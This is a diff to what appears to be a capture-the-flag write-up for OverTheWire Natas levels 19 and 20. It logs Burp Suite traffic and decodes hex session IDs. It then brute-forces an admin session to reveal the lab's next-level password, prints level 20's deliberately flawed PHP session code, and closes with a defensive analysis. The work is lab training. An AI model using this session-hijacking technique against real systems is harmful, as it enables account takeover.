@@ -2541,16 +2541,285 @@ URL: http://natas19.natas.labs.overthewire.org
 Username: natas19
 Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 ```
-After login, the webpage displayed an input field requesting a username, along with a Check existence button.
+After login, the webpage displayed a message: 
+```
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
 
-Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+Please login with your admin account to retrieve credentials for natas20.
+```
+It also provided username and password input fields along with a Login button.
+
+Additionally, viewing the page source (CTRL+U) revealed the following:
 ```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
 
-### Approach 
+<p>
+Please login with your admin account to retrieve credentials for natas20.
+</p>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+Attempting to log in using `username: admin` and `password: admin`. Initially, after login, the content captured using burpsuite
+#### Request content: 
+```
+POST /index.php HTTP/1.1
+Host: natas19.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://natas19.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
+Connection: keep-alive
+Referer: http://natas19.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin
+```
+
+#### Response content: 
+```
+HTTP/1.1 200 OK
+Date: Sat, 18 Apr 2026 05:58:40 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Set-Cookie: PHPSESSID=3531362d61646d696e; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1029
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>
+</body>
+</html>
+```
+
+After refreshing the browser,
+#### Request content: 
+```
+POST /index.php HTTP/1.1
+Host: natas19.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://natas19.natas.labs.overthewire.org/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://natas19.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=3531362d61646d696e
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin
+```
+
+#### Response content: 
+```
+HTTP/1.1 200 OK
+Date: Sat, 18 Apr 2026 06:00:47 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1029
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>
+</body>
+</html>
+```
+The response sets a session cookie, `Set-Cookie: PHPSESSID=3531362d61646d696e. 
+
+#### Decoding the Session ID
+The value 3531362d61646d696e appears to be hex-encoded. Decoding it from hexadecimal: `3531362d61646d696e → 516-admin`. This reveals that the session ID format is `<session_number>-<username>`.
+
+This indicates:
+- Session IDs are not random
+- They are predictable and encoded
+
+
+### Approach 
+#### Step 1: Understand the Pattern
+From decoding: `PHPSESSID = hex(<id>-<username>)`. Example: `516-admin → 3531362d61646d696e`
+
+#### Step 2: Identify Weakness
+Similar to the previous level:
+- Session IDs are still based on a numeric range
+- The difference is that they are now hex-encoded strings
+
+Thus, the attack becomes:
+- Brute force numeric IDs (1–640)
+- Append -admin
+- Encode in hex
+- Send as PHPSESSID
+
+
+#### Step 3: Brute Force Using Burp Suite
+Payload Preprocessing: `<ID>-admin → hex encode → PHPSESSID`. (selecting id part to be brute forced as number, and add suffix after the number and encode using ASCII hex)
+Example payload: `281-admin → 3238312d61646d696e`
+
+
+#### Step 4: Identify Successful Response
+##### Request content:
+```
+POST /index.php HTTP/1.1
+Host: natas19.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://natas19.natas.labs.overthewire.org/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://natas19.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=3238312d61646d696e
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin
+```
+
+##### Response content:
+```
+HTTP/1.1 200 OK
+Date: Sat, 18 Apr 2026 06:37:41 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1070
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
+</body>
+</html>
+```
+
+#### Result: 
+```
+You are an admin. The credentials for the next level are:
+
+Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+```
+
 
 ### Analysis
+This level demonstrates a predictable session ID with encoding obfuscation.
+
+Vulnerabilities:
+- Session IDs are not random
+- Sensitive information embedded in session structure (id-username)
+- Encoding (hex) used instead of proper security
+- Small keyspace (1–640) enables brute force
+
+Attack Type:
+- Session hijacking via predictable session IDs
+- Encoding bypass (hex decoding)
+
+Encoding (e.g., hex) is not a security mechanism. Even though session IDs are no longer sequential, they remain predictable and exploitable.
+
+Secure session design should:
+- Use cryptographically secure random values
+- Avoid embedding meaningful data in session IDs
+- Prevent brute-force enumeration
+
 
 ---
 
@@ -2559,16 +2828,146 @@ Additionally, a **View Sourcecode** link was available for further inspection. B
 ```
 URL: http://natas20.natas.labs.overthewire.org
 Username: natas20
-Password: 
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
 ```
-After login, the webpage displayed an input field requesting a username, along with a Check existence button.
+After login, the webpage displayed a message ` You are logged in as a regular user. Login as an admin to retrieve credentials for natas21. ` and input field requesting your name, along with a Change name button.
 
 Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
 ```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+<?php
 
-### Approach 
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+/* }}} */
 
-### Finding 
+/* we don't need this */
+function myopen($path, $name) {
+    //debug("MYOPEN $path $name");
+    return true;
+}
+
+/* we don't need this */
+function myclose() {
+    //debug("MYCLOSE");
+    return true;
+}
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode() ?: "";
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+    return true;
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug("MYDESTROY $sid");
+    return true;
+}
+/* we don't need this */
+function mygarbage($t) {
+    //debug("MYGARBAGE $t");
+    return true;
+}
+
+session_set_save_handler(
+    "myopen",
+    "myclose",
+    "myread",
+    "mywrite",
+    "mydestroy",
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+
+$name = "";
+if(array_key_exists("name", $_SESSION)) {
+    $name = $_SESSION["name"];
+}
+
+?>
+
+<form action="index.php" method="POST">
+Your name: <input name="name" value="<?=$name?>"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+### Approach
 
 ### Analysis
 
